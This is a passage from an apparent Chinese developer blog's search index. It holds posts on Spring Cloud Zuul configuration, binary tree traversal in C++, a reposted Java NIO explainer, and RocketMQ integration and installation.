&#123; return new ClientHttpResponse() &#123; @Override public HttpStatus getStatusCode() throws IOException &#123; return HttpStatus.OK; &#125; @Override public int getRawStatusCode() throws IOException &#123; return 200; &#125; @Override public String getStatusText() throws IOException &#123; return &quot;OK&quot;; &#125; @Override public void close() &#123; &#125; @Override public InputStream getBody() throws IOException &#123; return new ByteArrayInputStream(&quot;The service is unavailable.&quot;.getBytes()); &#125; @Override public HttpHeaders getHeaders() &#123; HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); return headers; &#125; &#125;; &#125;&#125;]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zuul 配置]]></title>
    <url>%2F2019%2F03%2F17%2Fspring-cloud%2Fzuul-1%2F</url>
    <content type="text"><![CDATA[zuul 配置123456789101112131415161718192021222324252627282930#url转发#zuul.routes.api-a-url.path=/api-a/**#zuul.routes.api-a-url.url=http://127.0.0.1:9000/#结合eureka 进行服务转发zuul.routes.agent.path=/project/**zuul.routes.agent.serviceId=project-centerzuul.routes.user-center.path=/uc/**zuul.routes.user-center.serviceId=user-centerzuul.routes.eureka=/eureka/**zuul.routes.eureka.serviceId=eureka-server#此外结合eureka eureka.client.service-url.defaultZone=http://eureka.wuxinvip.com/#以及结合config配置【以下配置需要放到bootstrap.properties中】#可以通过eureka注册中心获取配置中心spring.application.name=api-gateway#eureka.client.service-url.defaultZone=http://eureka.wuxinvip.com/#spring.cloud.config.discovery.enabled=true#spring.cloud.config.discovery.service-id=CONFIG-SERVER#也可以采用此种配置获取uri地址spring.application.name=api-gatewayspring.cloud.config.uri=http://config.wuxinvip.com {———-} zuul自定义拦截器1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/** * @title: * @description: * @author: 无心 * @date:2019/4/17 13:03 * @location com.wuxinvip.apigateway.route.DemoFilter.class */public class DemoFilter extends ZuulFilter &#123; private static Logger logger = LoggerFactory.getLogger(DemoFilter.class); //前置过滤器 @Override public String filterType() &#123; return null; &#125; //优先级，数字越大，优先级越低 @Override public int filterOrder() &#123; return 0; &#125; //是否执行该过滤器，true代表需要过滤 @Override public boolean shouldFilter() &#123; return false; &#125; @Override public Object run() throws ZuulException &#123; RequestContext ctx = RequestContext.getCurrentContext(); HttpServletRequest request = ctx.getRequest(); logger.info("send &#123;&#125; request to &#123;&#125;", request.getMethod(), request.getRequestURL().toString()); //获取传来的参数accessToken Object accessToken = request.getParameter("token"); //TODO //toke验证 可以选择连接redis、也可以选择连接权限组件、 //这里return的值没有意义，zuul框架没有使用该返回值 return null; &#125;&#125;]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二叉树的深度遍历与广度遍历]]></title>
    <url>%2F2019%2F03%2F16%2Fjdk%2Fjdk-tree-2%2F</url>
    <content type="text"><![CDATA[二叉树的深度优先遍历（DFS）与广度优先遍历（BFS） 深度优先遍历：从根节点出发，沿着左子树方向进行纵向遍历，直到找到叶子节点为止。然后回溯到前一个节点，进行右子树节点的遍历，直到遍历完所有可达节点为止。 广度优先遍历：从根节点出发，在横向遍历二叉树层段节点的基础上纵向遍历二叉树的层次。 {———-} DFS:A-B-D-E-C-F-G BFS:A-B-C-D-E-F-G DFS实现： 数据结构：栈 父节点入栈，父节点出栈，先右子节点入栈，后左子节点入栈。递归遍历全部节点即可 BFS实现： 数据结构：队列 父节点入队，父节点出队列，先左子节点入队，后右子节点入队。递归遍历全部节点即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;#include &lt;Stack&gt;#include &lt;Queue&gt;using namespace std; typedef struct Node &#123; char data; struct Node *lchild; struct Node *rchild;&#125; *Tree;//Tree 是一个node指针的类型定义 int index = 0; //全局索引变量//二叉树构造器,按先序遍历顺序构造二叉树//无左子树或右子树用&apos;#&apos;表示void treeNodeConstructor(Tree &amp;root, char data[])&#123; char e = data[index++]; if(e == &apos;#&apos;)&#123; root = NULL; &#125;else&#123; root = (Node *)malloc(sizeof(Node)); root-&gt;data = e; treeNodeConstructor(root-&gt;lchild, data); //递归构建左子树 treeNodeConstructor(root-&gt;rchild, data); //递归构建右子树 &#125;&#125;//深度优先遍历void depthFirstSearch(Tree root)&#123; stack&lt;Node *&gt; nodeStack; //使用C++的STL标准模板库 nodeStack.push(root); Node *node; while(!nodeStack.empty())&#123; node = nodeStack.top(); cout&lt;&lt;node-&gt;data;//遍历根结点 nodeStack.pop(); if(node-&gt;rchild)&#123; nodeStack.push(node-&gt;rchild); //先将右子树压栈 &#125; if(node-&gt;lchild)&#123; nodeStack.push(node-&gt;lchild); //再将左子树压栈 &#125; &#125;&#125; //广度优先遍历void breadthFirstSearch(Tree root)&#123; queue&lt;Node *&gt; nodeQueue; //使用C++的STL标准模板库 nodeQueue.push(root); Node *node; while(!nodeQueue.empty())&#123; node = nodeQueue.front(); nodeQueue.pop(); cout&lt;&lt;node-&gt;data;//遍历根结点 if(node-&gt;lchild)&#123; nodeQueue.push(node-&gt;lchild); //先将左子树入队 &#125; if(node-&gt;rchild)&#123; nodeQueue.push(node-&gt;rchild); //再将右子树入队 &#125; &#125;&#125; int main() &#123; //上图所示的二叉树先序遍历序列,其中用&apos;#&apos;表示结点无左子树或无右子树 char data[15] = &#123;&apos;A&apos;, &apos;B&apos;, &apos;D&apos;, &apos;#&apos;, &apos;#&apos;, &apos;E&apos;, &apos;#&apos;, &apos;#&apos;, &apos;C&apos;, &apos;F&apos;,&apos;#&apos;, &apos;#&apos;, &apos;G&apos;, &apos;#&apos;, &apos;#&apos;&#125;; Tree tree; treeNodeConstructor(tree, data); printf(&quot;深度优先遍历二叉树结果: &quot;); depthFirstSearch(tree); printf(&quot;\n\n广度优先遍历二叉树结果: &quot;); breadthFirstSearch(tree); return 0;&#125; 原文地址]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[遐想--定制应用]]></title>
    <url>%2F2019%2F01%2F12%2Fessay%2Fessay-20%2F</url>
    <content type="text"><![CDATA[随意遐想、马云说过、未来从普遍化走向定制化、在泛滥得互联网app中、会不会也会也有这么一条路子 现在各种app都是提供特殊的功能、 社交、微信、QQ、陌陌、音乐、网易云音乐、QQ音乐、酷狗音乐、酷我音乐、百度音乐等等 那么、我可不可以做一个定制应用、这个应用接入各种互联网应用后台？前期没有开放接口是不是可以做页面入口、web展示或者唤起、没有的就启用应用唤醒播放、 一家一个定制应用、在这个应用中、如有付费可以统一付费等等 然后把应用商店中得app全部做上权限管理、再把统一付费的钱、使用时间差打向各个服务应用 还可以加上阅读时间计时、以提醒用户沉浸使用、防沉迷机制]]></content>
      <categories>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TOGAF架构认证]]></title>
    <url>%2F2018%2F12%2F22%2Fessay%2Fessay-19%2F</url>
    <content type="text"><![CDATA[一入架构深似海啊 {———-} 没有梦想和咸鱼有什么区别 open group网站 wiki TOGAF图书馆 TOGAF9.2]]></content>
      <categories>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编程的套路]]></title>
    <url>%2F2018%2F12%2F12%2Fessay%2Fessay-18%2F</url>
    <content type="text"><![CDATA[有人讲linux底层原理是一切编程原理所在 {———-} 注册表 Kafka中消息序列化使用avro序列化、avro使用注册表机制 spring 容器初始化中的bean初始化使用注册表机制 win系统启动也是采用了注册表机制 avro 详解 avro 使用注册表来存储 协议schema、以便于消费者和生产者采用双方认可解析协议 解析数据 spring bean注册中、注册每一个bean类初始化类信息、方法、常量等等、在使用的时候注入应用中使用 windows的注册表是二进制的数据库、作为整个系统和应用上的核心数据库在各个应用中共享数据 套路：注册表:数据唯一识别、也可以作为协议、也可以作为数据库、共同点：数据特征识别、 数据存储 主副本数据存储 索引 hash索引【mysql】 btree索引【mysql】]]></content>
      <categories>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java NIO浅析【转】]]></title>
    <url>%2F2018%2F12%2F11%2Fjdk%2Fjdk-nio%2F</url>
    <content type="text"><![CDATA[写的很不错 从浅入深、还有代码示例、还有模型示例 转-美团技术团队-以示版权NIO（Non-blocking I/O，在Java领域，也称为New I/O），是一种同步非阻塞的I/O模型，也是I/O多路复用的基础，已经被越来越多地应用到大型应用服务器，成为解决高并发与大量连接、I/O处理问题的有效方式。 那么NIO的本质是什么样的呢？它是怎样与事件模型结合来解放线程、提高系统吞吐的呢？ 本文会从传统的阻塞I/O和线程池模型面临的问题讲起，然后对比几种常见I/O模型，一步步分析NIO怎么利用事件模型处理I/O，解决线程池瓶颈处理海量连接，包括利用面向事件的方式编写服务端/客户端程序。最后延展到一些高级主题，如Reactor与Proactor模型的对比、Selector的唤醒、Buffer的选择等。 注：本文的代码都是伪代码，主要是为了示意，不可用于生产环境。 {———-} 传统BIO模型分析让我们先回忆一下传统的服务器端同步阻塞I/O处理（也就是BIO，Blocking I/O）的经典编程模型： 1234567891011121314151617181920212223242526&#123; ExecutorService executor = Excutors.newFixedThreadPollExecutor(100);//线程池 ServerSocket serverSocket = new ServerSocket(); serverSocket.bind(8088); while(!Thread.currentThread.isInturrupted())&#123;//主线程死循环等待新连接到来 Socket socket = serverSocket.accept(); executor.submit(new ConnectIOnHandler(socket));//为新的连接创建新的线程&#125;class ConnectIOnHandler extends Thread&#123; private Socket socket; public ConnectIOnHandler(Socket socket)&#123; this.socket = socket; &#125; public void run()&#123; while(!Thread.currentThread.isInturrupted()&amp;&amp;!socket.isClosed())&#123;死循环处理读写事件 String someThing = socket.read()....//读取数据 if(someThing!=null)&#123; ......//处理数据 socket.write()....//写数据 &#125; &#125; &#125;&#125; 这是一个经典的每连接每线程的模型，之所以使用多线程，主要原因在于socket.accept()、socket.read()、socket.write()三个主要函数都是同步阻塞的，当一个连接在处理I/O的时候，系统是阻塞的，如果是单线程的话必然就挂死在那里；但CPU是被释放出来的，开启多线程，就可以让CPU去处理更多的事情。其实这也是所有使用多线程的本质： 利用多核。 当I/O阻塞系统，但CPU空闲的时候，可以利用多线程使用CPU资源。 现在的多线程一般都使用线程池，可以让线程的创建和回收成本相对较低。在活动连接数不是特别高（小于单机1000）的情况下，这种模型是比较不错的，可以让每一个连接专注于自己的I/O并且编程模型简单，也不用过多考虑系统的过载、限流等问题。线程池本身就是一个天然的漏斗，可以缓冲一些系统处理不了的连接或请求。 不过，这个模型最本质的问题在于，严重依赖于线程。但线程是很”贵”的资源，主要表现在： 线程的创建和销毁成本很高，在Linux这样的操作系统中，线程本质上就是一个进程。创建和销毁都是重量级的系统函数。 线程本身占用较大内存，像Java的线程栈，一般至少分配512K～1M的空间，如果系统中的线程数过千，恐怕整个JVM的内存都会被吃掉一半。 线程的切换成本是很高的。操作系统发生线程切换的时候，需要保留线程的上下文，然后执行系统调用。如果线程数过高，可能执行线程切换的时间甚至会大于线程执行的时间，这时候带来的表现往往是系统load偏高、CPU sy使用率特别高（超过20%以上)，导致系统几乎陷入不可用的状态。 容易造成锯齿状的系统负载。因为系统负载是用活动线程数或CPU核心数，一旦线程数量高但外部网络环境不是很稳定，就很容易造成大量请求的结果同时返回，激活大量阻塞线程从而使系统负载压力过大。 所以，当面对十万甚至百万级连接的时候，传统的BIO模型是无能为力的。随着移动端应用的兴起和各种网络游戏的盛行，百万级长连接日趋普遍，此时，必然需要一种更高效的I/O处理模型。 NIO是怎么工作的很多刚接触NIO的人，第一眼看到的就是Java相对晦涩的API，比如：Channel，Selector，Socket什么的；然后就是一坨上百行的代码来演示NIO的服务端Demo……瞬间头大有没有？ 我们不管这些，抛开现象看本质，先分析下NIO是怎么工作的。 常见I/O模型对比所有的系统I/O都分为两个阶段：等待就绪和操作。举例来说，读函数，分为等待系统可读和真正的读；同理，写函数分为等待网卡可以写和真正的写。 需要说明的是等待就绪的阻塞是不使用CPU的，是在“空等”；而真正的读写操作的阻塞是使用CPU的，真正在”干活”，而且这个过程非常快，属于memory copy，带宽通常在1GB/s级别以上，可以理解为基本不耗时。 下图是几种常见I/O模型的对比： 以socket.read()为例子： 传统的BIO里面socket.read()，如果TCP RecvBuffer里没有数据，函数会一直阻塞，直到收到数据，返回读到的数据。 对于NIO，如果TCP RecvBuffer有数据，就把数据从网卡读到内存，并且返回给用户；反之则直接返回0，永远不会阻塞。 最新的AIO(Async I/O)里面会更进一步：不但等待就绪是非阻塞的，就连数据从网卡到内存的过程也是异步的。 换句话说，BIO里用户最关心“我要读”，NIO里用户最关心”我可以读了”，在AIO模型里用户更需要关注的是“读完了”。 NIO一个重要的特点是：socket主要的读、写、注册和接收函数，在等待就绪阶段都是非阻塞的，真正的I/O操作是同步阻塞的（消耗CPU但性能非常高）。 如何结合事件模型使用NIO同步非阻塞特性回忆BIO模型，之所以需要多线程，是因为在进行I/O操作的时候，一是没有办法知道到底能不能写、能不能读，只能”傻等”，即使通过各种估算，算出来操作系统没有能力进行读写，也没法在socket.read()和socket.write()函数中返回，这两个函数无法进行有效的中断。所以除了多开线程另起炉灶，没有好的办法利用CPU。 NIO的读写函数可以立刻返回，这就给了我们不开线程利用CPU的最好机会：如果一个连接不能读写（socket.read()返回0或者socket.write()返回0），我们可以把这件事记下来，记录的方式通常是在Selector上注册标记位，然后切换到其它就绪的连接（channel）继续进行读写。 下面具体看下如何利用事件模型单线程处理所有I/O请求： NIO的主要事件有几个：读就绪、写就绪、有新连接到来。 我们首先需要注册当这几个事件到来的时候所对应的处理器。然后在合适的时机告诉事件选择器：我对这个事件感兴趣。对于写操作，就是写不出去的时候对写事件感兴趣；对于读操作，就是完成连接和系统没有办法承载新读入的数据的时；对于accept，一般是服务器刚启动的时候；而对于connect，一般是connect失败需要重连或者直接异步调用connect的时候。 其次，用一个死循环选择就绪的事件，会执行系统调用（Linux 2.6之前是select、poll，2.6之后是epoll，Windows是IOCP），还会阻塞的等待新事件的到来。新事件到来的时候，会在selector上注册标记位，标示可读、可写或者有连接到来。 注意，select是阻塞的，无论是通过操作系统的通知（epoll）还是不停的轮询(select，poll)，这个函数是阻塞的。所以你可以放心大胆地在一个while(true)里面调用这个函数而不用担心CPU空转。 所以我们的程序大概的模样是： 12345678910111213141516171819202122232425262728interface ChannelHandler&#123; void channelReadable(Channel channel); void channelWritable(Channel channel); &#125; class Channel&#123; Socket socket; Event event;//读，写或者连接 &#125; //IO线程主循环: class IoThread extends Thread&#123; public void run()&#123; Channel channel; while(channel=Selector.select())&#123;//选择就绪的事件和对应的连接 if(channel.event==accept)&#123; registerNewChannelHandler(channel);//如果是新连接，则注册一个新的读写处理器 &#125; if(channel.event==write)&#123; getChannelHandler(channel).channelWritable(channel);//如果可以写，则执行写事件 &#125; if(channel.event==read)&#123; getChannelHandler(channel).channelReadable(channel);//如果可以读，则执行读事件 &#125; &#125; &#125; Map&lt;Channel，ChannelHandler&gt; handlerMap;//所有channel的对应事件处理器&#125; 这个程序很简短，也是最简单的Reactor模式：注册所有感兴趣的事件处理器，单线程轮询选择就绪事件，执行事件处理器。 优化线程模型由上面的示例我们大概可以总结出NIO是怎么解决掉线程的瓶颈并处理海量连接的： NIO由原来的阻塞读写（占用线程）变成了单线程轮询事件，找到可以进行读写的网络描述符进行读写。除了事件的轮询是阻塞的（没有可干的事情必须要阻塞），剩余的I/O操作都是纯CPU操作，没有必要开启多线程。 并且由于线程的节约，连接数大的时候因为线程切换带来的问题也随之解决，进而为处理海量连接提供了可能。 单线程处理I/O的效率确实非常高，没有线程切换，只是拼命的读、写、选择事件。但现在的服务器，一般都是多核处理器，如果能够利用多核心进行I/O，无疑对效率会有更大的提高。 仔细分析一下我们需要的线程，其实主要包括以下几种： 事件分发器，单线程选择就绪的事件。 I/O处理器，包括connect、read、write等，这种纯CPU操作，一般开启CPU核心个线程就可以。 业务线程，在处理完I/O后，业务一般还会有自己的业务逻辑，有的还会有其他的阻塞I/O，如DB操作，RPC等。只要有阻塞，就需要单独的线程。 Java的Selector对于Linux系统来说，有一个致命限制：同一个channel的select不能被并发的调用。因此，如果有多个I/O线程，必须保证：一个socket只能属于一个IoThread，而一个IoThread可以管理多个socket。 另外连接的处理和读写的处理通常可以选择分开，这样对于海量连接的注册和读写就可以分发。虽然read()和write()是比较高效无阻塞的函数，但毕竟会占用CPU，如果面对更高的并发则无能为力。 NIO在客户端的魔力通过上面的分析，可以看出NIO在服务端对于解放线程，优化I/O和处理海量连接方面，确实有自己的用武之地。那么在客户端上，NIO又有什么使用场景呢? 常见的客户端BIO+连接池模型，可以建立n个连接，然后当某一个连接被I/O占用的时候，可以使用其他连接来提高性能。 但多线程的模型面临和服务端相同的问题：如果指望增加连接数来提高性能，则连接数又受制于线程数、线程很贵、无法建立很多线程，则性能遇到瓶颈。 每连接顺序请求的Redis对于Redis来说，由于服务端是全局串行的，能够保证同一连接的所有请求与返回顺序一致。这样可以使用单线程＋队列，把请求数据缓冲。然后pipeline发送，返回future，然后channel可读时，直接在队列中把future取回来，done()就可以了。 12345678910111213141516171819202122232425262728伪代码如下：class RedisClient Implements ChannelHandler&#123; private BlockingQueue CmdQueue; private EventLoop eventLoop; private Channel channel; class Cmd&#123; String cmd; Future result; &#125; public Future get(String key)&#123; Cmd cmd= new Cmd(key); queue.offer(cmd); eventLoop.submit(new Runnable()&#123; List list = new ArrayList(); queue.drainTo(list); if(channel.isWritable())&#123; channel.writeAndFlush(list); &#125; &#125;); &#125; public void ChannelReadFinish(Channel channel，Buffer Buffer)&#123; List result = handleBuffer();//处理数据 //从cmdQueue取出future，并设值，future.done(); &#125; public void ChannelWritable(Channel channel)&#123; channel.flush(); &#125;&#125; 这样做，能够充分的利用pipeline来提高I/O能力，同时获取异步处理能力。 多连接短连接的HttpClient类似于竞对抓取的项目，往往需要建立无数的HTTP短连接，然后抓取，然后销毁，当需要单机抓取上千网站线程数又受制的时候，怎么保证性能呢? 何不尝试NIO，单线程进行连接、写、读操作？如果连接、读、写操作系统没有能力处理，简单的注册一个事件，等待下次循环就好了。 如何存储不同的请求/响应呢？由于http是无状态没有版本的协议，又没有办法使用队列，好像办法不多。比较笨的办法是对于不同的socket，直接存储socket的引用作为map的key。 常见的RPC框架，如Thrift，Dubbo这种框架内部一般维护了请求的协议和请求号，可以维护一个以请求号为key，结果的result为future的map，结合NIO+长连接，获取非常不错的性能。 NIO高级主题Proactor与Reactor一般情况下，I/O 复用机制需要事件分发器（event dispatcher）。 事件分发器的作用，即将那些读写事件源分发给各读写事件的处理者，就像送快递的在楼下喊: 谁谁谁的快递到了， 快来拿吧！开发人员在开始的时候需要在分发器那里注册感兴趣的事件，并提供相应的处理者（event handler)，或者是回调函数；事件分发器在适当的时候，会将请求的事件分发给这些handler或者回调函数。 涉及到事件分发器的两种模式称为：Reactor和Proactor。 Reactor模式是基于同步I/O的，而Proactor模式是和异步I/O相关的。在Reactor模式中，事件分发器等待某个事件或者可应用或个操作的状态发生（比如文件描述符可读写，或者是socket可读写），事件分发器就把这个事件传给事先注册的事件处理函数或者回调函数，由后者来做实际的读写操作。 而在Proactor模式中，事件处理者（或者代由事件分发器发起）直接发起一个异步读写操作（相当于请求），而实际的工作是由操作系统来完成的。发起时，需要提供的参数包括用于存放读到数据的缓存区、读的数据大小或用于存放外发数据的缓存区，以及这个请求完后的回调函数等信息。事件分发器得知了这个请求，它默默等待这个请求的完成，然后转发完成事件给相应的事件处理者或者回调。举例来说，在Windows上事件处理者投递了一个异步IO操作（称为overlapped技术），事件分发器等IO Complete事件完成。这种异步模式的典型实现是基于操作系统底层异步API的，所以我们可称之为“系统级别”的或者“真正意义上”的异步，因为具体的读写是由操作系统代劳的。 举个例子，将有助于理解Reactor与Proactor二者的差异，以读操作为例（写操作类似）。 在Reactor中实现读 注册读就绪事件和相应的事件处理器。 事件分发器等待事件。 事件到来，激活分发器，分发器调用事件对应的处理器。 事件处理器完成实际的读操作，处理读到的数据，注册新的事件，然后返还控制权。 在Proactor中实现读： 处理器发起异步读操作（注意：操作系统必须支持异步IO）。在这种情况下，处理器无视IO就绪事件，它关注的是完成事件。 事件分发器等待操作完成事件。 在分发器等待过程中，操作系统利用并行的内核线程执行实际的读操作，并将结果数据存入用户自定义缓冲区，最后通知事件分发器读操作完成。 事件分发器呼唤处理器。 事件处理器处理用户自定义缓冲区中的数据，然后启动一个新的异步操作，并将控制权返回事件分发器。 可以看出，两个模式的相同点，都是对某个I/O事件的事件通知（即告诉某个模块，这个I/O操作可以进行或已经完成)。在结构上，两者也有相同点：事件分发器负责提交IO操作（异步)、查询设备是否可操作（同步)，然后当条件满足时，就回调handler；不同点在于，异步情况下（Proactor)，当回调handler时，表示I/O操作已经完成；同步情况下（Reactor)，回调handler时，表示I/O设备可以进行某个操作（can read 或 can write)。 下面，我们将尝试应对为Proactor和Reactor模式建立可移植框架的挑战。在改进方案中，我们将Reactor原来位于事件处理器内的Read/Write操作移至分发器（不妨将这个思路称为“模拟异步”），以此寻求将Reactor多路同步I/O转化为模拟异步I/O。以读操作为例子，改进过程如下： 注册读就绪事件和相应的事件处理器。并为分发器提供数据缓冲区地址，需要读取数据量等信息。 分发器等待事件（如在select()上等待）。 事件到来，激活分发器。分发器执行一个非阻塞读操作（它有完成这个操作所需的全部信息），最后调用对应处理器。 事件处理器处理用户自定义缓冲区的数据，注册新的事件（当然同样要给出数据缓冲区地址，需要读取的数据量等信息），最后将控制权返还分发器。 如我们所见，通过对多路I/O模式功能结构的改造，可将Reactor转化为Proactor模式。改造前后，模型实际完成的工作量没有增加，只不过参与者间对工作职责稍加调换。没有工作量的改变，自然不会造成性能的削弱。对如下各步骤的比较，可以证明工作量的恒定： 标准/典型的Reactor： 步骤1：等待事件到来（Reactor负责）。 步骤2：将读就绪事件分发给用户定义的处理器（Reactor负责）。 步骤3：读数据（用户处理器负责）。 步骤4：处理数据（用户处理器负责）。 标准/改进实现的模拟Proactor： 步骤1：等待事件到来（Proactor负责）。 步骤2：得到读就绪事件，执行读数据（现在由Proactor负责）。 步骤3：将读完成事件分发给用户处理器（Proactor负责）。 步骤4：处理数据（用户处理器负责）。 对于不提供异步I/O API的操作系统来说，这种办法可以隐藏Socket API的交互细节，从而对外暴露一个完整的异步接口。借此，我们就可以进一步构建完全可移植的，平台无关的，有通用对外接口的解决方案。 1234567891011121314151617181920212223242526272829303132333435363738代码示例如下：interface ChannelHandler&#123; void channelReadComplate(Channel channel，byte[] data); void channelWritable(Channel channel); &#125; class Channel&#123; Socket socket; Event event;//读，写或者连接 &#125; //IO线程主循环： class IoThread extends Thread&#123; public void run()&#123; Channel channel; while(channel=Selector.select())&#123;//选择就绪的事件和对应的连接 if(channel.event==accept)&#123; registerNewChannelHandler(channel);//如果是新连接，则注册一个新的读写处理器 Selector.interested(read); &#125; if(channel.event==write)&#123; getChannelHandler(channel).channelWritable(channel);//如果可以写，则执行写事件 &#125; if(channel.event==read)&#123; byte[] data = channel.read(); if(channel.read()==0)//没有读到数据，表示本次数据读完了 &#123; getChannelHandler(channel).channelReadComplate(channel，data;//处理读完成事件 &#125; if(过载保护)&#123; Selector.interested(read); &#125; &#125; &#125; &#125; Map&lt;Channel，ChannelHandler&gt; handlerMap;//所有channel的对应事件处理器 &#125; Selector.wakeup()主要作用 解除阻塞在Selector.select()/select(long)上的线程，立即返回。 两次成功的select之间多次调用wakeup等价于一次调用。 如果当前没有阻塞在select上，则本次wakeup调用将作用于下一次select——“记忆”作用。 为什么要唤醒？ 注册了新的channel或者事件。 channel关闭，取消注册。 优先级更高的事件触发（如定时器事件），希望及时处理。 原理Linux上利用pipe调用创建一个管道，Windows上则是一个loopback的tcp连接。这是因为win32的管道无法加入select的fd set，将管道或者TCP连接加入select fd set。 wakeup往管道或者连接写入一个字节，阻塞的select因为有I/O事件就绪，立即返回。可见，wakeup的调用开销不可忽视。 Buffer的选择通常情况下，操作系统的一次写操作分为两步： 将数据从用户空间拷贝到系统空间。 从系统空间往网卡写。同理，读操作也分为两步： ① 将数据从网卡拷贝到系统空间； ② 将数据从系统空间拷贝到用户空间。 对于NIO来说，缓存的使用可以使用DirectByteBuffer和HeapByteBuffer。如果使用了DirectByteBuffer，一般来说可以减少一次系统空间到用户空间的拷贝。但Buffer创建和销毁的成本更高，更不宜维护，通常会用内存池来提高性能。 如果数据量比较小的中小应用情况下，可以考虑使用heapBuffer；反之可以用directBuffer。 NIO存在的问题使用NIO != 高性能，当连接数&lt;1000，并发程度不高或者局域网环境下NIO并没有显著的性能优势。 NIO并没有完全屏蔽平台差异，它仍然是基于各个操作系统的I/O系统实现的，差异仍然存在。使用NIO做网络编程构建事件驱动模型并不容易，陷阱重重。 推荐大家使用成熟的NIO框架，如Netty，MINA等。解决了很多NIO的陷阱，并屏蔽了操作系统的差异，有较好的性能和编程模型。 总结最后总结一下到底NIO给我们带来了些什么： native函数库中封装一个方法 java/direct buffer对象 来操作对外内存、避免java堆和native堆来回复制数据 本地方发栈 【执行native方法栈】 虚拟机栈 【 执行java程序使用栈】 事件驱动模型 避免多线程 单线程处理多任务 非阻塞I/O，I/O读写不再阻塞，而是返回0 基于block的传输，通常比基于流的传输更高效 更高级的IO函数，zero-copy IO多路复用大大提高了Java网络应用的可伸缩性和实用性]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rocketmq使用示例]]></title>
    <url>%2F2018%2F12%2F08%2Fmessage-queue%2Frocketmq%2F04%2F</url>
    <content type="text"><![CDATA[spring cloud中集成rocketmq {———-} spring cloud中集成rocketmq代码地址 12345678910111213141516171819202122232425262728293031323334/** * 接收bean 将消息发送到spring event事件中进行处理 解耦数据处理 * 屏蔽rockemq的依赖性 可以不影响业务转换别的消息组件 */@Componentpublic class ConsumerMessageListener implements MessageListener &#123; private static final Logger logger = LoggerFactory.getLogger(ConsumerMessageListener.class); @Autowired ApplicationContext applicationContext; public Action consume(Message message, ConsumeContext context) &#123; System.out.println(&quot;Receive: &quot; + message); try &#123; logger.info(&quot;rocket 接收到消息:&#123;&#125;&quot;,message); //do something.. applicationContext.publishEvent(new RocketmqEvent(message)); return Action.CommitMessage; //消息处理正常 &#125; catch (Exception e) &#123; //消费失败 logger.error(&quot;rocket 消息处理失败 ：&#123;&#125;&quot;,message); return Action.ReconsumeLater;//消息加入重试 &#125; &#125; /** * 接收示例 */ @EventListener(condition = &quot;#event.topic==&apos;your.topic&apos; &amp;&amp; #event.tag==&apos;your.tag&apos;&quot;) public void MessageListener(RocketmqEvent rocketmqEvent) throws IOException &#123; String string = rocketmqEvent.getMsg(); &#125; 1234567891011121314151617181920/** * 发送bean类 * 引用统一发送 解耦数据处理 * 屏蔽rockemq的依赖性 可以不影响业务转换别的消息组件 */@Componentpublic class MessageQueueTemplate &#123; @Autowired ProducerBean producerBean; public void send(RocketmqEvent rocketmqEvent)&#123; Message message = new Message(); message.setTopic(rocketmqEvent.getTopic()); message.setTag(rocketmqEvent.getTag()); message.setBody(rocketmqEvent.getMsg().getBytes()); producerBean.send(message); &#125;&#125;]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>rocketmq</category>
      </categories>
      <tags>
        <tag>RocketMQ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rocketmq图解]]></title>
    <url>%2F2018%2F12%2F07%2Fmessage-queue%2Frocketmq%2F03%2F</url>
    <content type="text"><![CDATA[组件结构图 {———-} RocketMQ 各个角色关系 与kafka区别就是 kafka使用zk来管理服务注册、rocketmq用的自己的rpc【nameserver】]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>rocketmq</category>
      </categories>
      <tags>
        <tag>RocketMQ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rocketmq安装]]></title>
    <url>%2F2018%2F12%2F06%2Fmessage-queue%2Frocketmq%2F02%2F</url>
    <content type="text"><![CDATA[安装1234567891011121314# 基础环境64bit OS, Linux/Unix/Mac is recommended;64bit JDK 1.8+;Maven 3.2.x;Git;4g+ free disk for Broker servercurl -L -O https://www.apache.org/dyn/closer.cgi?path=rocketmq/4.3.2/rocketmq-all-4.3.2-bin-release.zip&gt; unzip rocketmq-all-4.3.2-source-release.zip &gt; cd rocketmq-all-4.3.2/ &gt; mvn -Prelease-all -DskipTests clean install -U &gt; cd distribution/target/apache-rocketmq {———-} 启动1234567891011121314151617#启动nameserver&gt; nohup sh bin/mqnamesrv &amp;&gt; tail -f ~/logs/rocketmqlogs/namesrv.logThe Name Server boot success...#启动broker&gt; nohup sh bin/mqbroker -n localhost:9876 &amp;&gt; tail -f ~/logs/rocketmqlogs/broker.log The broker[%s, 172.30.30.233:10911] boot success...#发送消息&gt; export NAMESRV_ADDR=localhost:9876&gt; sh bin/tools.sh org.apache.rocketmq.example.quickstart.ProducerSendResult [sendStatus=SEND_OK, msgId= ...&gt; sh bin/tools.sh org.apache.rocketmq.example.quickstart.ConsumerConsumeMessageThread_%d Receive New Messages: [MessageExt... 关闭12345678&gt; sh bin/mqshutdown brokerThe mqbroker(36695) is running...Send shutdown request to mqbroker(36695) OK&gt; sh bin/mqshutdown namesrvThe mqnamesrv(36664) is running...Send shutdown request to mqnamesrv(36664) OK]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
        <category>rocketmq</category>
      </categories>
